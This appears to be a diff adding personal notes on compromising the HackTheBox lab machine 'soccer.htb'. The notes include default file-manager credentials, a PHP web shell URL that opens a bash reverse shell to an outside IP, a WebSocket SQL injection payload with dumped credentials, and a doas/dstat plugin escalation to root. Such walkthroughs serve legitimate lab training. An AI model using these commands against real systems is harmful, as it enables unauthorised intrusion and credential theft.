@@ -1,0 +1,66 @@
+10.129.1.160
+[
+	gobuster:::
+		tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
+	wfuzz:::
+		000008034:   301        7 L      12 W       178 Ch      "tiny"
+	
+	firefox:::
+		default credentials::  /tiny
+			admin:admin@123
+
+		fileUpload:::  nc -nlvp 443
+
+			http://soccer.htb/tiny/uploads/mochi.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.237/443 0>%261"							%26 == &
+
+			http://soccer.htb/tiny/uploads/mochi.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.15.201/443%200%3E%261%22
+	
+
+	firefox:::  http://soc-player.soccer.htb/signup
+
+			test@test.com : test1234
+
+	
+	burp:::  proxy-__> WebSockets History   
+			http://soc-player.soccer.htb/check (pasalo al repeater ...)
+
+			
+			:: Repeater			(la interfazDeRepeater cambia un poco por ser websockets)
+
+					{
+						"id":"test or 1=1-- -"							(si...  or 1=1-- -   sin comilla simple en el 'or  , con comilla funciona)
+					}																					
+																										ticket_id = '1' or 1=1-- -';			||   ticket_id = 1 or 1=1;
+
+
+	python3 ver2.0_sqli.py:::
+		[▝] Database Name: mysql,information_schema,performance_schema,sys,soccer_db
+
+		ver3.0_sqli.py:::
+			[◣]  Tables Name [soccer_db]: accounts
+	
+		ver4.0_sqli.py:::
+			[▄]  Tables Name [soccer_db]: id,email,username,password
+
+		ver5.0_sqli.py:::
+			[ ]  Tables Name [soccer_db]: player:PlayerOftheMatch2022
+
+
+		{{{				User:player   Pass:PlayerOftheMatch2022
+
+			::: find / -perm -4000 2>/dev/null
+							/usr/local/bin/doas
+
+			::: cat /usr/local/etc/doas.conf
+						permit nopass player as root cmd /usr/bin/dstat
+
+			gtfobins::  dstat
+			::: echo 'import os; os.execv("/bin/bash", ["bash"])' > /usr/local/share/dstat/dstat_mochimango.py
+
+			::: doas /usr/bin/dstats --mochimango
+
+			ROOT:::...<3 <3 <3
+
+		}}}
+
+]
